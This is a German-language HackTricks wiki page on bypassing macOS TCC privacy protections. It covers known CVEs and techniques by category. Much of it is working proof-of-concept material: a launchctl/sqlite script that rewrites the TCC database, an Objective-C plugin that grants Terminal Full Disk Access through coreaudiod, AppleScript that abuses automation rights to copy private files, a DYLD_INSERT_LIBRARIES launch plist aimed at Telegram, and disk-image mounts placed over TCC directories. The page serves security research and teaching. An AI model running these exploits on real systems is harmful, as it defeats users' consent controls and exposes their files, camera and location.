# TCC Bypasses unter macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Nach Funktionalität

### Write Bypass

Dies ist kein Bypass, sondern lediglich die Funktionsweise von TCC: **TCC schützt nicht vor dem Schreiben**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es dennoch darin schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **creators app** Lesezugriff darauf zu gewähren.

### TCC ClickJacking

Es ist möglich, **ein Fenster über den TCC-Prompt zu legen**, damit der Benutzer ihn **unbemerkt akzeptiert**. Einen PoC findest du unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie dazu bringen, Zugriff auf einen durch TCC geschützten Ort anzufordern. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
Außerdem ist es möglich, die legitime App **aus dem Dock zu entfernen und die gefälschte dort abzulegen**, sodass die gefälschte App beim Anklicken (sie kann dasselbe Symbol verwenden) die legitime App aufrufen, TCC-Berechtigungen anfordern und eine Malware ausführen kann. Dadurch glaubt der Benutzer, dass die legitime App den Zugriff angefordert hat.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und einen PoC findest du unter:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standardmäßig verfügte ein Zugriff über **SSH über "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgeführt, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: Standardmäßig verfügte ein Zugriff über SSH über "Full Disk Access". Um dies zu deaktivieren, muss SSH aufgeführt, aber deaktiviert sein (durch das Entfernen ...](<../../../../../images/image (1077).png>)

Hier findest du Beispiele dafür, wie einige **Malwares diesen Schutz umgehen konnten**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Beachte, dass du jetzt **Full Disk Access** benötigst, um SSH aktivieren zu können.

### Handle extensions - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um einer **bestimmten Anwendung Leseberechtigungen dafür zu gewähren.** Dieses Attribut wird gesetzt, wenn eine Datei per **drag\&drop** auf eine App gezogen wird oder wenn ein Benutzer eine Datei **doppelt anklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Dateierweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (wodurch der bösartigen Datei Lesezugriff darauf gewährt wird).

### iCloud

Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`**-XPC-Service zu kommunizieren, der **iCloud-Tokens bereitstellt**.

**iMovie** und **Garageband** verfügten über dieses und weitere Entitlements, die dies ermöglichten.

Weitere **Informationen** über den Exploit zum **Abrufen von iCloud-Tokens** über dieses Entitlement findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise die **den anderen Apps erteilten Berechtigungen missbrauchen** kann.

Weitere Informationen zu Apple Scripts findest du unter:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Wenn eine App beispielsweise über eine **Automation-Berechtigung für `iTerm`** verfügt, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, das über kein FDA verfügt, kann iTerm aufrufen, das über diese Berechtigung verfügt, und es für die Ausführung von Aktionen verwenden:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Über den Finder

Oder wenn eine App über den Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der **userland tccd daemon** verwendete die **`HOME`**-**env**-Variable, um auf die TCC-Benutzerdatenbank unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Laut [diesem Stack-Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und weil der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Benutzers ausgeführt wird, ist es möglich, **alle an ihn übergebenen Umgebungsvariablen zu kontrollieren**.\
Daher könnte ein **Angreifer die Umgebungsvariable `$HOME`** in **`launchctl`** so setzen, dass sie auf ein **kontrolliertes** **Verzeichnis** zeigt, den **TCC** daemon neu starten und anschließend die **TCC-Datenbank direkt ändern**, um sich selbst **jede verfügbare TCC entitlement** zu gewähren, ohne den Endbenutzer jemals dazu aufzufordern.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes hatte Zugriff auf durch TCC geschützte Orte, aber wenn eine Notiz erstellt wird, wird diese **an einem nicht geschützten Ort erstellt**. Daher konnte man Notes auffordern, eine geschützte Datei in eine Notiz zu kopieren (also an einen nicht geschützten Ort), und anschließend auf die Datei zugreifen:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Das Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` besaß das Entitlement `com.apple.private.nullfs_allow`, das es erlaubte, **nullfs**-Mounts zu erstellen. Außerdem besaß es das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantäne-Attribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt wurde und auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.

### CVE-2024-44131 - FileProvider symlink race

Apps, die Dateioperationen an einen **privilegierten Helper** (hier **`fileproviderd`** / **`Files.app`**) übergeben, kopieren oder verschieben Elemente **im Namen des Benutzers**, sodass der Kopiervorgang mit den Privilegien des Helpers statt mit denen des Aufrufers ausgeführt wird.

Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung einem **Race** ausgesetzt werden kann: Statt den Symlink auf der **letzten** Pfadkomponente zu platzieren (die überprüft wird), ersetzt der Angreifer ein **mittleres** Verzeichnis des Pfads, **nachdem der Kopiervorgang bereits begonnen hat**. Der privilegierte Helper folgt anschließend dem vom Angreifer kontrollierten Link und liest oder schreibt TCC-geschützte Orte, **ohne jemals einen Prompt anzuzeigen**.<sup>[7]</sup>

Verzeichnisse, die in ihrem Pfad **nicht** durch eine zufällige UUID geschützt sind (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für den Race vorhersehen kann.

> [!TIP]
> Dies ist das generische Muster, nach dem gesucht werden sollte: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder `rename()`/`copyfile()`, bei denen Quelle und Ziel getrennt aufgelöst werden), kann durch das Austauschen eines Verzeichnisses in der Mitte des Pfads einem Race ausgesetzt werden. Nur `O_NOFOLLOW_ANY`, `openat()` auf einem bereits geöffneten Verzeichnis-FD oder `realpath()` + erneute Validierung schließen das Zeitfenster tatsächlich.

Weitere Informationen im [**Writeup von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kann mit `SQLITE_ENABLE_SQLLOG` kompiliert werden, wodurch ein durch Umgebungsvariablen gesteuerter Logging-Hook hinzugefügt wird ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Log der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB eine **neue Kopie** erstellen, statt eine vorhandene wiederzuverwenden.
- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung nur dann loggen, wenn neben der Haupt-DB eine Datei `<database>-sqllog` existiert.

Wenn du diese Variable in einen Prozess injizieren kannst, der über **FDA** verfügt und SQLite-Datenbanken öffnet, wird dieser bereitwillig **diese geschützten Datenbanken** in ein von dir kontrolliertes Verzeichnis kopieren. Da der Zieldateiname aus angreiferkontrollierten Daten abgeleitet wird, verwandelt ein am Ziel platzierter **Symlink** dasselbe Primitive in einen **beliebigen Dateischreibvorgang** mit den Privilegien des Zielprozesses.

### **SQLITE_AUTO_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen zu **loggen**. Viele Anwendungen verwendeten diese Library, sodass es möglich war, alle ihre SQLite-Abfragen zu loggen.

Mehrere Apple-Anwendungen verwendeten diese Library, um auf TCC-geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Suche nach env-var-gesteuerten Dateischreibvorgängen

Die beiden vorherigen Einträge sind Beispiele für dieselbe generische Technik, und es lohnt sich, nach weiteren zu suchen: **In TCC-privilegierte Apps geladene frameworks stellen häufig Debug-/Logging-Umgebungsvariablen bereit, durch die der Prozess eine Datei an einem vom Aufrufer kontrollierten Pfad erstellt**.

Workflow, um sie zu finden:

1. Wähle ein Ziel mit FDA oder einer anderen interessanten TCC-Berechtigung (`Music`, `TV`, `Terminal`, MDM agents...) und liste die frameworks auf, mit denen es verknüpft ist (`otool -L`, `vmmap`).
2. Durchsuche diese frameworks nach `getenv`-Strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Setze die Kandidatenvariablen über `launchctl setenv NAME /path/you/control`, starte die App und beobachte mit `fs_usage -w -f filesys <pid>` oder `sudo fs_usage | grep <path>`, was sie im Dateisystem macht.
4. Wenn der Prozess eine Datei in deinem Verzeichnis **erstellt oder umbenennt**, hast du ein write primitive: Verweise das Ziel auf einen symlink (oder race ein Zwischenverzeichnis, wie oben bei CVE-2024-44131) um, damit der Vorgang auf `~/Library/Application Support/com.apple.TCC/TCC.db` umgeleitet wird.

> [!TIP]
> Zwei Dinge schränken dies ein. Erstens werden **`DYLD_*`-Variablen für hardened-runtime-Binaries ignoriert**, sofern die App nicht das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) enthält ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple einzelne framework-Debugvariablen, sobald diese gemeldet werden, sodass eine Variable, die in einem macOS-Release funktioniert hat, im nächsten häufig nicht mehr vorhanden ist. Wenn eine App nach dem Setzen einer solchen Variable den Start still verweigert, behandle die Variable als bereits gefiltert.

Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du den entsprechenden Trick mit linker-Variablen.

### Apple Remote Desktop

Als root könntest du diesen Service aktivieren, woraufhin der **ARD agent vollständigen Festplattenzugriff hätte**. Dieser könnte anschließend von einem Benutzer missbraucht werden, um eine neue **TCC user database** zu kopieren.

## Über **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Verzeichnis des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
Wenn es dem Benutzer daher gelingt, TCC mit einer `$HOME`-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** verweist, könnte der Benutzer eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App jede TCC-Berechtigung zu gewähren.

> [!TIP]
> Beachte, dass Apple die Einstellung im Benutzerprofil im Attribut **`NFSHomeDirectory`** als **Wert von `$HOME`** verwendet. Wenn du eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option daher mit einem TCC bypass **weaponize**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Ermittle einen _csreq_-Blob für die Ziel-App.
2. Platziere eine gefälschte _TCC.db_-Datei mit dem erforderlichen Zugriff und dem _csreq_-Blob.
3. Exportiere den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändere den Directory-Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importiere den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppe das _tccd_ des Benutzers und starte den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das über `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` verfügte.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, über die ein Angreifer ein **custom Bundle zum Laden** angeben konnte. Daher ersetzt der Exploit die Methode zum Ändern des Home-Verzeichnisses über **`dsexport`** und **`dsimport`** durch eine **`configd` code injection**.

Weitere Informationen findest du im [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Über process injection

Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Privilegien zu missbrauchen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Darüber hinaus erfolgt die häufigste gefundene process injection zum Umgehen von TCC über **plugins (load library)**.\
Plugins sind zusätzlicher Code, üblicherweise in Form von libraries oder plist, der **von der Hauptanwendung geladen** wird und in deren Kontext ausgeführt wird. Wenn die Hauptanwendung daher Zugriff auf TCC-eingeschränkte Dateien hatte (über erteilte Berechtigungen oder entitlements), verfügt auch der **custom code darüber**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` verfügte über das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte keine **hardened** Runtime.

Um diese CVE zu weaponize, wird **`NFSHomeDirectory`** geändert (unter Ausnutzung des vorherigen Entitlements), um die **TCC database des Benutzers zu übernehmen** und TCC zu umgehen.

Weitere Informationen findest du im [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

Das Binary **`/usr/sbin/coreaudiod`** verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte code injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.

Dieses Binary erlaubte das Laden von **third party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, mit diesem POC **ein Plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Weitere Informationen finden Sie im [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Systemanwendungen, die einen Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden diese **Plugins** innerhalb des Prozesses. Sie befinden sich in `/Library/CoreMediaIO/Plug-Ins/DAL` (nicht durch SIP geschützt).

Das einfache Speichern einer Bibliothek mit dem üblichen **constructor** an diesem Ort reicht aus, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren dafür anfällig.

### Firefox

Die Firefox-Anwendung verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Weitere Informationen dazu, wie man dies einfach exploiten kann, findest du im [**original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

Die Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` hatte die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch es möglich war, Code in den Prozess zu injizieren und die TCC-Privilegien zu nutzen.

### CVE-2023-26818 - Telegram

Telegram hatte die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass es möglich war, dies zu missbrauchen, um **Zugriff auf dessen Berechtigungen zu erhalten**, beispielsweise zum Aufnehmen mit der Kamera. Du kannst [**das Payload im writeup finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Beachte, dass zur Verwendung der env variable zum Laden einer library ein **custom plist** erstellt wurde, um diese library zu injizieren, und **`launchctl`** verwendet wurde, um sie zu starten:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch `open`-Aufrufe

Es ist möglich, **`open`** auch innerhalb einer Sandbox aufzurufen.

### Terminal-Skripte

Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Außerdem ist es möglich, damit **`.terminal`**-Skripte aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, wobei der auszuführende Befehl im Schlüssel **`CommandString`** steht:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch Mounten

### CVE-2020-9771 - mount_apfs TCC bypass und privilege escalation

**Jeder Benutzer** (auch nicht privilegierte Benutzer) kann einen Time-Machine-Snapshot erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (z. B. `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss, der von einem Administrator gewährt werden muss.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine ausführlichere Erklärung ist im [**Originalbericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 – Mount über TCC-Datei

Auch wenn die TCC-DB-Datei geschützt war, war es möglich, eine neue TCC.db-Datei **über das Verzeichnis zu mounten**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Prüfe den **vollständigen Exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Wie im [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) erklärt, nutzte dieses CVE `diskarbitrationd` aus.<sup>[18]</sup>

Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Sicherheitsprüfungen durch. Es ist jedoch möglich, diese zu umgehen, indem `diskarbitrationd` direkt aufgerufen wird und dadurch `../`-Elemente im Pfad sowie symlinks verwendet werden.

Dies ermöglichte es einem Angreifer, beliebige Mounts an jedem beliebigen Ort durchzuführen, auch über der TCC-Datenbank, da `diskarbitrationd` über die Berechtigung `com.apple.private.security.storage-exempt.heritable` verfügt.

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch TCC-Schutzmechanismen umgangen wurden.

### CVE-2022-22655 - Location Services

Location Services werden nicht wie die anderen Services in einer TCC-Datenbank gespeichert. Sie werden von `locationd` verwaltet, das seine eigene Allow-list in **`/var/db/locationd/clients.plist`** führt:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Jeder Eintrag ist nach dem Client (Bundle ID oder executable path) geordnet und enthält Felder wie `Authorized`, `BundleId`, `Executable` und `Registered`.

Die Datei `clients.plist` selbst ist durch Sandbox/TCC geschützt und kann nicht einmal als root bearbeitet werden — das Verzeichnis **`/var/db/locationd/` war jedoch nicht vor dem Mounten geschützt**. Ein Angreifer mit root-Rechten konnte daher ein Disk-Image mit einer eigenen `clients.plist` erstellen (in der das eigene Binary als `Authorized` markiert war), es über das Verzeichnis mounten und `locationd` neu starten, damit die gefälschte Allow-Liste wirksam wurde.<sup>[5]</sup>

> [!TIP]
> Dies entspricht demselben Muster wie bei den oben genannten `hdiutil`/`mount`-TCC-bypasses: Die *Datei* ist geschützt, das *Verzeichnis, in dem sie liegt*, jedoch nicht. Daher ersetzt man das gesamte Verzeichnis anstelle der Datei.

## Über Startup-Apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Über grep

In mehreren Fällen speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten ... an nicht geschützten Speicherorten (was bei Apple als Schwachstelle gilt).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dies funktioniert nicht mehr, aber [**in der Vergangenheit hat es funktioniert**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Eine weitere Möglichkeit unter Verwendung von [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenzen

- [1] [CVE-2020–9934: Umgehen des macOS-Transparency-, Consent- and Control-(TCC)-Frameworks](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS-TCC-User-Privacy-Protections durch Zufall und Design umgehen](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Möglichkeiten, die Privacy-Mechanismen von macOS zu umgehen](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEUE Möglichkeiten, die Privacy-Mechanismen von macOS zu umgehen](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC-Location-Services-bypass (Originalbericht)](https://theevilbit.github.io/posts/cve-2022-22655/)
